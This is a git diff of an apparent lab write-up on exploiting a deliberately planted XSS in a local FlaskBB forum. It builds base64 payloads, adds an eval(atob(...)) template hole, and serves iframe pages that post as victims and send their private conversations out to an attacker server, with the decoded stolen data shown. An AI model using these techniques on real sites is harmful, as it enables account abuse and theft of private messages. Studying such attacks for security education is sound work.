@@ -1,6 +1,6 @@
 Attacks
 =======
-Given a vulnerable application, we will try to devellop some realistic attack scenarios. The focus is really not on triggering the XSS, but rather demonstrating ways to fully exploit it.
+Given a vulnerable application, we will try to develop some realistic attack scenarios. The focus is really not on triggering the XSS, but rather demonstrating ways to fully exploit it.
 First we will setup a vulnerable application, then propose 3 different attacks :
 
     - execute actions on behalf of user
@@ -17,7 +17,7 @@ First step is to add our extra XSS "feature". We kept it simple by adding a new 
 
 The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules, and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[1]
 
-Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts.
+Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts !
 
 II. Post a message on behalf of a user.
 ---------------------------------------
@@ -61,13 +61,44 @@ Step 8 : At this point we should run our payload through a js minifyer. Here we 
 
 Step 9 : Now, all we have to do is put it somewhere on internet and bring authenticated users of our forum to visit it.
 
-    echo "<iframe src='localhost:8080/xss/$(cat xssless-payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html
+    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html
     cd malicious-website && python3 -m http.server 1337
 
 Step 10 : profit !  [[Images ?]]
 
 III. Read a user's private conversations.
 -----------------------------------------
+Of course, like any exploit, this one is dirty as heck. But hey, it kind of works.
+
+    base64 -w0 read-private.js > read-private.b64
+
+    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/read-private.b64)'></iframe>" > malicious-website/read-private.html
+    cd malicious-website && python3 -m http.server 1337
+
+When someone visits localhost:1337/read-private.html :
+
+    "GET /%5B%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test1%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Private%20conversation%20is%20private%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20Or%20is%20it%20%3F%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Another%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20%E2%80%9Cprivate%E2%80%9D%20conversation%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20last%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20of%20thoses%20%22%0A%20%20%7D%0A%5D HTTP/1.1" 404 -
+
+    >> rcv="%5B%0...7D%0A%5D"
+    >> python2 -c "from urllib import unquote; print unquote('$rcv');"
+        [
+          {
+            "author": "test1",
+            "title": " Private conversation is private ",
+            "content": " Or is it ? "
+          },
+          {
+            "author": "test3",
+            "title": " Another ",
+            "content": " “private” conversation "
+          },
+          {
+            "author": "test3",
+            "title": " last ",
+            "content": " of thoses "
+          }
+        ]
+
 
 IV. Steal a user's password, and beyond ! Man In the Browser.
 -------------------------------------------------------------
@@ -88,5 +119,17 @@ Refs
 
             templates/forum/index.html (l4)
                 <script>eval(atob("{{ payload }}"))</script>
+        Also, because of a bug I removed thoses lines :
+            templates/forum/topic.html
+                {% if topic.first_post_id == post.id %}
+                    {% if current_user|delete_topic(topic.first_post.user_id, topic.forum) %}
+                    <a href="{{ url_for('forum.delete_topic', topic_id=topic.id, slug=topic.slug) }}">Delete</a> |
+                    {% endif %}
+                {% else %}
+                    {% if current_user|delete_post(post.user_id, topic.forum) %}
+                    <a href="{{ url_for('forum.delete_post', post_id=post.id) }}">Delete</a> |
+                    {% endif %}
+                {% endif %}
+        and didn't investigate any further...
     [2] http://portswigger.net/burp/
     [3] https://github.com/mandatoryprogrammer/xssless
